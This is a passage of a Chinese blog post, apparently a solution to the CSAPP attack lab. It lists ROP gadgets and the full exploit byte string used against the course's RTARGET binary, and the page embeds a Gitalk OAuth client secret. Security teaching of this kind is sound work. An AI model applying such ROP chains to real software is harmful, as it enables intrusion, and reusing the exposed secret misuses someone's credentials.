+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">000027 &lt;addval_219&gt;:</span><br><span class="line">   0x4019a7 &lt;+0&gt;:     8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">   0x4019ad &lt;+6&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x4019ab: 58             pop %rax</span><br><span class="line">   0x4019ac: 90</span><br><span class="line">   0x4019ad: c3</span><br><span class="line"></span><br><span class="line">0001b2 &lt;addval_487&gt;:</span><br><span class="line">   0x401a40 &lt;+0&gt;:     8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">   0x401a46 &lt;+6&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x401a42: 89 c2          movl %eax, %edx</span><br><span class="line">   0x401a44: 84 c0          tesb %al, %al</span><br><span class="line">   0x401a46: c3             retq</span><br><span class="line"></span><br><span class="line">000196 &lt;getval_159&gt;:</span><br><span class="line">   0x401a33 &lt;+0&gt;:     b8 89 d1 38 c9  mov    $0xc938d189,%eax</span><br><span class="line">   0x401a38 &lt;+5&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x401a34: 89 d1          movl %edx, %ecx</span><br><span class="line">   0x401a36: 38 c9          cmpb %cl, %cl</span><br><span class="line">   0x401a38: c3             retq</span><br><span class="line"></span><br><span class="line">000143 &lt;addval_436&gt;:</span><br><span class="line">   0x401a11 &lt;+0&gt;:     8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">   0x401a17 &lt;+6&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x401a13: 89 ce          movl %ecx, %esi</span><br><span class="line">   0x401a15: 90             nop</span><br><span class="line">   0x401a16: 90             nop</span><br><span class="line">   0x401a17: c3             retq</span><br><span class="line"></span><br><span class="line">0002b8 &lt;setval_350&gt;:</span><br><span class="line">   0x401aab &lt;+0&gt;:     c7 07 48 89 e0 90       	movl   $0x90e08948,(%rdi)</span><br><span class="line">   0x401ab1 &lt;+6&gt;:     c3      					retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x401aad: 48 89 e0		mov %rsp, %rax</span><br><span class="line">   0x401ab0: 90</span><br><span class="line">   0x401ab1: c3</span><br><span class="line"></span><br><span class="line">000016 &lt;addval_273&gt;:</span><br><span class="line">   0x4019a0 &lt;+0&gt;:     8d 87 48 89 c7 c3       lea    -0x3c3876b8 (%rdi),%eax</span><br><span class="line">   0x4019a6 &lt;+6&gt;:     c3                      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x4019a2: 48 89 c7		mov %rax, %rdi</span><br><span class="line">   0x4019a5: c3</span><br><span class="line"></span><br><span class="line">0000a2 &lt;add_xy&gt;:</span><br><span class="line">   0x4019d6 &lt;+0&gt;:     48 8d 04 37     			lea    (%rdi,%rsi,1),%rax</span><br><span class="line">   0x4019da &lt;+4&gt;:     c3      					retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x4019d6: 48 8d 04 37	lea (%rdi, %rsi, 1), %rax</span><br><span class="line">   0x4019da: c3</span><br><span class="line"></span><br><span class="line">000016 &lt;addval_273&gt;:</span><br><span class="line">   0x4019a0 &lt;+0&gt;:     8d 87 48 89 c7 c3       lea    -0x3c3876b8 (%rdi),%eax</span><br><span class="line">   0x4019a6 &lt;+6&gt;:     c3                      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x4019a2: 48 89 c7		mov %rax, %rdi</span><br><span class="line">   0x4019a5: c3</span><br><span class="line"></span><br><span class="line">xxxxxx &lt;touch3&gt;</span><br><span class="line">   0x4018fa</span><br></pre></td></tr></table></figure>
+<p>RTARGET 的输入字节序列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00 11 22 33 44 55 66 77</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "../../21/CSAPP-archlab/" title= "CSAPP - archlab">
+                    <div class="nextTitle">CSAPP - archlab</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "../../16/CSAPP-bomblab/" title= "CSAPP - bomblab">
+                    <div class="prevTitle">CSAPP - bomblab</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+	const gitalk = new Gitalk({
+		clientID: '38ea5d8ced7dd6f7499f',
+		clientSecret: 'ec2ab733801f235f78cd1d8016be50f7b92dd808',
+		repo: 'mcginn7.github.io',
+		owner: 'mcginn7',
+		admin: ['mcginn7'],
+		id: location.pathname,      // Ensure uniqueness and length less than 50
+		distractionFreeMode: false  // Facebook-like distraction free mode
+	})
+	gitalk.render('gitalk-container')
+</script>
+
+
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:mingqinchen@foxmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/mcginn7" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#知识点"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目"><span class="toc-number">2.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-1"><span class="toc-number">2.1.</span> <span class="toc-text">Level 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#要求"><span class="toc-number">2.1.1.</span> <span class="toc-text">要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#做法"><span class="toc-number">2.1.2.</span> <span class="toc-text">做法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-2"><span class="toc-number">2.2.</span> <span class="toc-text">Level 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#要求-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#做法-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">做法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-3"><span class="toc-number">2.3.</span> <span class="toc-text">Level 3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#要求-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#做法-2"><span class="toc-number">2.3.2.</span> <span class="toc-text">做法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-4"><span class="toc-number">2.4.</span> <span class="toc-text">Level 4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#要求-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#做法-3"><span class="toc-number">2.4.2.</span> <span class="toc-text">做法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-5"><span class="toc-number">2.5.</span> <span class="toc-text">Level 5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#要求-4"><span class="toc-number">2.5.1.</span> <span class="toc-text">要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#做法-4"><span class="toc-number">2.5.2.</span> <span class="toc-text">做法</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 27
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/27</span><a class="archive-post-title" href= "../../27/SGU-301-350/" >SGU-301-350</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/13</span><a class="archive-post-title" href= "" >Deep Retrieval</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "../../../04/24/SGU-253-300/" >SGU-253-300</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/06</span><a class="archive-post-title" href= "../../../../2020/10/06/SGU-153-252/" >SGU 153-252</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href= "../../../../2020/05/10/Kuhn-Munkres-Algorithm/" >Kuhn-Munkres Algorithm</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "../../../../2020/02/23/CSAPP-cachelab/" >CSAPP - cachelab</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/21</span><a class="archive-post-title" href= "../../../../2020/02/21/CSAPP-archlab/" >CSAPP - archlab</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "../../../../2020/02/19/CSAPP-attacklab/" >CSAPP - attacklab</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span><a class="archive-post-title" href= "../../../../2020/02/16/CSAPP-bomblab/" >CSAPP - bomblab</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span><a class="archive-post-title" href= "../../../../2020/02/14/CSAPP-datalab/" >CSAPP - datalab</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "../../../../2020/01/09/Vim-for-windows-配置/" >Windows 下使用 Vim</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "../../../../2019/11/20/Palindromic-Factorization/" >回文分解算法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "../../../../2019/11/15/SGU-100-152/" >SGU 100~152</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span><a class="archive-post-title" href= "../../../../2019/10/31/polya/" >Pólya计数法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span><a class="archive-post-title" href= "../../../../2019/07/22/B-Tree/" >B-Tree</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "../../../../2019/05/31/AhoCorasick-Algorithm/" >AhoCorasick Algorithm</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/24</span><a class="archive-post-title" href= "../../../../2019/05/24/Knuth-Morris-Pratt-Algorithm/" >Knuth-Morris-Pratt Algorithm</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "../../../../2019/05/12/ICPC-Resolver-踩坑/" >ICPC Resolver 踩坑</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/03</span><a class="archive-post-title" href= "../../../../2019/04/03/斜率优化/" >斜率优化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span><a class="archive-post-title" href= "../../../../2019/03/31/Nowcoder-出题人的数组/" >Nowcoder-出题人的数组</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "../../../../2018/10/09/论文笔记-Tips-and-Tricks-for-Visual-Question-Answering/" >论文笔记 Tips and Tricks for Visual Question Answering</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "../../../../2018/10/04/DOMjudge配置/" >DOMjudge 配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "../../../../2018/08/18/论文笔记 Semantic Compositional Networks for Visual Captioning/" >论文笔记 Semantic Compositional Networks for Visual Captioning</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "../../../../2018/07/19/The Binding of Isaac Afterbirth+总结/" >The Binding of Isaac:Afterbirth+总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "../../../../2018/07/19/The Binding of Isaac Afterbirth+总结-ChenMingqin.work/" >The Binding of Isaac:Afterbirth+总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "../../../../2018/07/17/论文阅读记录/" >论文阅读记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span><a class="archive-post-title" href= "../../../../2018/06/05/apt-offline管理Ubuntu离线安装软件包/" >Ubuntu离线安装软件包</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="AhoCorasick"><span class="iconfont-archer">&#xe606;</span>AhoCorasick</span>
+    
+        <span class="sidebar-tag-name" data-tags="AC自动机"><span class="iconfont-archer">&#xe606;</span>AC自动机</span>
+    
+        <span class="sidebar-tag-name" data-tags="DR"><span class="iconfont-archer">&#xe606;</span>DR</span>
+    
+        <span class="sidebar-tag-name" data-tags="domjudge"><span class="iconfont-archer">&#xe606;</span>domjudge</span>
+    
+        <span class="sidebar-tag-name" data-tags="KMP"><span class="iconfont-archer">&#xe606;</span>KMP</span>
+    
+        <span class="sidebar-tag-name" data-tags="ICPC"><span class="iconfont-archer">&#xe606;</span>ICPC</span>
+    
+        <span class="sidebar-tag-name" data-tags="贪心"><span class="iconfont-archer">&#xe606;</span>贪心</span>
+    
+        <span class="sidebar-tag-name" data-tags="vim"><span class="iconfont-archer">&#xe606;</span>vim</span>
+    
+        <span class="sidebar-tag-name" data-tags="git bash"><span class="iconfont-archer">&#xe606;</span>git bash</span>
+    
+        <span class="sidebar-tag-name" data-tags="polya"><span class="iconfont-archer">&#xe606;</span>polya</span>
+    
+        <span class="sidebar-tag-name" data-tags="斜率优化"><span class="iconfont-archer">&#xe606;</span>斜率优化</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Mcginn"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="../../../../lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="../../../../scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="../../../../scripts/share.js" async></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->    
+     
+    </body>
+</html>
+
+
